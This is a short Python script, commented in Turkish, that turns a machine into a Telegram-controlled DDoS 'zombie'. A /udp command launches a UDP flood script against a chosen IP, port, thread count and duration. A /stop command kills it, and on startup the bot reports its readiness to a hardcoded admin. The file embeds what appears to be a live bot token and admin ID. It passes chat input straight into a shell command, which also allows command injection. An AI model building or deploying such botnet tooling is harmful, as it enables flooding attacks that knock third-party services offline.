import os
import subprocess
import time

# --- OTOMATİK KÜTÜPHANE KURULUMU ---
try:
    import telebot
except ImportError:
    os.system("pip3 install pyTelegramBotAPI")
    import telebot

# --- SENİN BİLGİLERİN ---
TOKEN = "8818747282:AAGHb-qVWw-4eCZiFCEx1MC3h7OnoXeNLtI"
ADMIN_ID = 2019064003

bot = telebot.TeleBot(TOKEN)

# --- /udp KOMUTU ---
@bot.message_handler(commands=['udp'])
def attack(message):
    if message.from_user.id == ADMIN_ID:
        try:
            # Kullanım: /udp 1.1.1.1 80 500 60
            args = message.text.split()
            if len(args) < 5:
                bot.reply_to(message, "❌ Eksik komut! Kullanım: /udp IP PORT THREAD SÜRE")
                return
                
            target, port, threads, duration = args[1], args[2], args[3], args[4]
            
            # udp.py'ın sunucuda olup olmadığını kontrol et, yoksa indir (Opsiyonel)
            # subprocess.Popen(f"python3 udp.py {target} {port} {threads} {duration}", shell=True)
            
            # Doğrudan mermi scriptini ateşle
            subprocess.Popen(f"python3 udp.py {target} {port} {threads} {duration}", shell=True)
            bot.reply_to(message, f"🚀 Mermiler yağdırılıyor... \n🎯 Hedef: {target}:{port}\n⏰ Süre: {duration}sn")
            
        except Exception as e:
            bot.reply_to(message, f"❌ Hata oluştu kanka: {str(e)}")

# --- /stop KOMUTU ---
@bot.message_handler(commands=['stop'])
def stop_attack(message):
    if message.from_user.id == ADMIN_ID:
        try:
            # Çalışan tüm udp.py işlemlerini tek seferde bitirir
            os.system("pkill -f udp.py")
            bot.reply_to(message, "🛑 Operasyon durduruldu. Tüm zombiler beklemede.")
        except:
            pass

# Zombi ilk açıldığında komutana bilgi veriyor
try:
    bot.send_message(ADMIN_ID, "🧟 Zombi hazır usta! Emirlerini bekliyorum.")
except:
    pass

# Bağlantı kopsa bile botu hayatta tutar
bot.infinity_polling()
